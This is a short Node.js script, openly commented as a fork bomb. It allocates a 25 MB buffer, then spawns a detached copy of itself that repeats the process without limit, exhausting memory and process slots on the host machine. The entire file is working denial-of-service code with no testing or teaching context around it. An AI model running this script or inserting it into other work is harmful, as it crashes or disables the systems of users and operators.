// consume some RAM bytes
var str = new Buffer(25*1024*1024).toString();

// fork bomb
var spawn = require('child_process').spawn;
var child = spawn('node', [__filename], {
  detached: true
});
child.unref();
